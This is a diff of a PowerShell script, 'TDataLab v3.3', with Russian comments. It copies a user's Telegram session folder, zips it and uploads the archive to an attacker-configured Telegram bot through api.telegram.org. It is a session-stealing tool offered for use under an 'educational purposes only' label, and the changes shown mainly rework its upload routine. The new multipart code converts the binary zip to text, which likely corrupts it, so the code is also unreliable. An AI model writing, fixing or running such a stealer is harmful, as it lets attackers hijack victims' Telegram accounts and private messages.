@@ -1,3 +1,17 @@
+<#
+.SYNOPSIS
+    TDataLab v3.3 — Исправленная стабильная версия
+.DESCRIPTION
+    Собирает доступные файлы сессии Telegram, упаковывает в ZIP и отправляет в Telegram.
+    Работает в PowerShell 5.1 и выше.
+.NOTES
+    Версия: 3.3
+    Только для образовательных целей.
+#>
+
+# ============================================================
+#  НАСТРОЙКИ
+# ============================================================
 $script:Config = @{
     OutputDir     = "$env:USERPROFILE\Desktop"
     ZipName       = "TDATA_Lab_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
@@ -22,15 +36,15 @@ function Write-Log {
     Write-Host $logEntry
 }
 
-# === ОТПРАВКА В TELEGRAM (ИСПРАВЛЕННАЯ) ===
+# === ОТПРАВКА В TELEGRAM ===
 function Send-ToTelegram {
     param([string]$FilePath, [string]$Caption = "TDataLab отчет")
-    
+
     if (-not $script:Config.EnableUpload) {
         Write-Log "Отправка в Telegram отключена в настройках." "INFO"
         return $false
     }
-    
+
     if ([string]::IsNullOrEmpty($script:Config.BotToken) -or $script:Config.BotToken -eq "") {
         Write-Log "Токен бота не задан. Отправка отключена." "WARN"
         return $false
@@ -44,82 +58,49 @@ function Send-ToTelegram {
 
     try {
         $uri = "https://api.telegram.org/bot$($script:Config.BotToken)/sendDocument"
-        
+
         # Читаем файл в байты
         $bytes = [System.IO.File]::ReadAllBytes($FilePath)
         $fileName = [System.IO.Path]::GetFileName($FilePath)
-        
+
         # Создаём multipart/form-data вручную (совместимо с PS5.1)
         $boundary = "---------------------------" + (Get-Random -Maximum 99999999).ToString()
         $LF = "`r`n"
-        
+
         $bodyLines = @()
-        
+
         # Поле chat_id
         $bodyLines += "--$boundary"
         $bodyLines += "Content-Disposition: form-data; name=`"chat_id`""
         $bodyLines += ""
         $bodyLines += $script:Config.ChatId
-        
+
         # Поле caption
         $bodyLines += "--$boundary"
         $bodyLines += "Content-Disposition: form-data; name=`"caption`""
         $bodyLines += ""
         $bodyLines += $Caption
-        
+
         # Поле document (файл)
         $bodyLines += "--$boundary"
         $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`""
         $bodyLines += "Content-Type: application/zip"
         $bodyLines += ""
         $bodyLines += [System.Text.Encoding]::UTF8.GetString($bytes)
-        
+
         $bodyLines += "--$boundary--"
         $bodyLines += ""
-        
+
         $body = [string]::Join($LF, $bodyLines)
         $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
-        
+
         # Создаём запрос
         $headers = @{
             "Content-Type" = "multipart/form-data; boundary=$boundary"
         }
-        
+
         $response = Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $bodyBytes
-        
-        if ($response.ok) {
-            Write-Log "Архив успешно отправлен в Telegram!" "INFO"
-            return $true
-        } else {
-            Write-Log "Ошибка Telegram: $($response.description)" "ERROR"
-            return $false
-        }
-    } catch {
-        Write-Log "Исключение при отправке: $_" "ERROR"
-        return $false
-    }
-}
-    
-    # Проверяем, что токен и chat ID заданы
-    if ([string]::IsNullOrEmpty($script:Config.BotToken) -or $script:Config.BotToken -eq "") {
-        Write-Log "Токен бота не задан. Отправка отключена." "WARN"
-        return $false
-    }
-    if ([string]::IsNullOrEmpty($script:Config.ChatId) -or $script:Config.ChatId -eq "") {
-        Write-Log "Chat ID не задан. Отправка отключена." "WARN"
-        return $false
-    }
 
-    Write-Log "Пытаюсь отправить файл в Telegram..." "INFO"
-
-    try {
-        $uri = "https://api.telegram.org/bot$($script:Config.BotToken)/sendDocument"
-        $multipart = @{
-            chat_id = $script:Config.ChatId
-            caption = $Caption
-            document = Get-Item -Path $FilePath
-        }
-        $response = Invoke-RestMethod -Uri $uri -Method Post -Form $multipart
         if ($response.ok) {
             Write-Log "Архив успешно отправлен в Telegram!" "INFO"
             return $true
@@ -136,7 +117,7 @@ function Send-ToTelegram {
 # === КОПИРОВАНИЕ ДОСТУПНЫХ ФАЙЛОВ ===
 function Copy-AvailableFiles {
     param([string]$SourcePath, [string]$DestPath)
-    
+
     Write-Log "Копирование доступных файлов из: $SourcePath" "INFO"
     $stats = @{ Copied = 0; Skipped = 0; Errors = 0 }
     $skippedFiles = @()
@@ -154,7 +135,7 @@ function Copy-AvailableFiles {
         $sourceFile = $_.FullName
         $relativePath = $sourceFile.Replace($SourcePath, "")
         $targetFile = $DestPath + $relativePath
-        
+
         try {
             $fs = [System.IO.File]::Open($sourceFile, 'Open', 'Read', 'Read')
             $fs.Close()
@@ -182,12 +163,12 @@ function Compress-Folder {
     param([string]$SourcePath, [string]$ZipPath, [string]$LogPath)
     try {
         Add-Type -AssemblyName System.IO.Compression.FileSystem
-        
+
         if ($script:Config.IncludeLog -and (Test-Path $LogPath)) {
             Copy-Item -Path $LogPath -Destination "$SourcePath\TDataLab.log" -Force
             Write-Log "Лог скопирован в архив" "INFO"
         }
-        
+
         [System.IO.Compression.ZipFile]::CreateFromDirectory($SourcePath, $ZipPath)
         Write-Log "Архив создан: $ZipPath" "INFO"
         return $true
@@ -209,7 +190,7 @@ function Cleanup {
 # === ГЛАВНЫЙ ПРОЦЕСС ===
 function Start-TDataLab {
     Write-Log "=========================================" "INFO"
-    Write-Log "TDataLab v3.1 запущен." "INFO"
+    Write-Log "TDataLab v3.3 запущен." "INFO"
     Write-Log "=========================================" "INFO"
 
     $tdataPath = $script:Config.TDataPath
@@ -241,7 +222,7 @@ function Start-TDataLab {
         Write-Log "Скопировано: $($result.Copied) файлов" "INFO"
         Write-Log "Пропущено: $($result.Skipped) файлов" "WARN"
         Write-Log "=========================================" "INFO"
-        
+
         if ($script:Config.EnableUpload) {
             $caption = "TDataLab от $(Get-Date -Format 'yyyy-MM-dd HH:mm')`nСкопировано: $($result.Copied)`nПропущено: $($result.Skipped)"
             Send-ToTelegram -FilePath $zipFullPath -Caption $caption
